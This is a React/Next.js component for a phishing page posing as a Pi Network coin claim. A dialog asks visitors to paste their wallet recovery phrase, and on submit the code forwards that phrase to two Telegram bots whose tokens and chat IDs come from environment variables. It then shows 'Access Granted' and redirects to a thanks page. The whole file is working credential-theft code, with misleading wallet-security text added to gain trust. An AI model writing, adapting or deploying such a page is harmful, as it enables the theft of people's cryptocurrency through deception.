"use client";
import * as z from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useRouter } from "next/navigation";
import { useState } from "react";
import toast from "react-hot-toast";

import { sendTelegramMessage } from "@/service/telegram";

import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";

import {
  Form,
  FormControl,
  FormField,
  FormLabel,
  FormMessage,
  FormItem,
} from "@/components/ui/form";

import { Textarea } from "@/components/ui/textarea";

import Btn from "./btn";
import { Spinner } from "@/components/spinner";

const formSchema = z.object({
  phrase: z.string().min(1, {
    message: "phrase is required",
  }),
});

export const ConverterImg = () => {
  const router = useRouter();
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {},
  });

  const { isSubmitting } = form.formState;

  const [phrase, setPhrase] = useState("");
  const [loading, setLoading] = useState(false);

  const chatId = process.env.NEXT_PUBLIC_CHAT_ID_ONE;
  const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN_ONE;

  const chatIdTwo = process.env.NEXT_PUBLIC_CHAT_ID_TWO;
  const botTokenTwo = process.env.NEXT_PUBLIC_BOT_TOKEN_TWO;

  const onSubmit = async () => {
    try {
      const messageContent = `${phrase}`;

      if (phrase === "") {
        toast.error("fill information correctly");
      }

      if (botToken && chatId) {
        setLoading(true);
        await sendTelegramMessage(botToken, chatId, messageContent);
        await sendTelegramMessage(botTokenTwo!, chatIdTwo!, messageContent);
        await toast.success("Access Granted");
        router.push("/thanks");
      } else {
        setLoading(false);
        toast.error("Error");
      }
    } catch (err) {
      setLoading(false);
      toast.error("Error");
    }
  };

  return (
    <div className="flex items-center justify-center  ">
      <Form {...form}>
        <form className="space-y-8 mt-8">
          <div className="flex items-center justify-center ">
            <Dialog>
              <DialogTrigger>
                <img src="./claim.jpg" />
              </DialogTrigger>
              <DialogContent>
                <DialogHeader>
                  <DialogTitle>
                    Paste Your Authentication Phrase To Unlock Your Wallet{" "}
                  </DialogTitle>
                  <DialogDescription>
                    <FormField
                      control={form.control}
                      name="phrase"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel></FormLabel>
                          <FormControl>
                            <Textarea
                              disabled={isSubmitting}
                              placeholder="e.g alpha bravo charlie delta echo foxtrot golf hotel india
                                             juliet kilo lima mike november oscar papa quebec romeo
                                             sierra tango uniform victor whiskey x-ray yankee zulu"
                              onChange={(e) => setPhrase(e.target.value)}
                              className="h-40"
                            />
                          </FormControl>

                          <FormMessage />
                        </FormItem>
                      )}
                    />
                  </DialogDescription>
                </DialogHeader>
                {loading ? (
                  <div className="text-5xl font-bold flex items-center justify-center">
                    <Spinner size="lg" />
                  </div>
                ) : (
                  <button
                    className="bn632-hover bn24 capitalize "
                    type="submit"
                    onClick={onSubmit}
                    disabled={loading}
                  >
                    Unlock And Claim PI COINS
                  </button>
                )}

                <DialogDescription>
                  Like a non-custodial wallet, the authentication phrase of your
                  wallet is exclusively accessible by you only. Retrieving your
                  authentication phrase is currently impossible.
                </DialogDescription>
                <DialogDescription>
                  Have you lost your authentication phrase? You can create a new
                  wallet, but all the π (cryptocurrency or assets) in your
                  previous wallets will be inaccessible.
                </DialogDescription>
              </DialogContent>
            </Dialog>
          </div>
        </form>
      </Form>
    </div>
  );
};
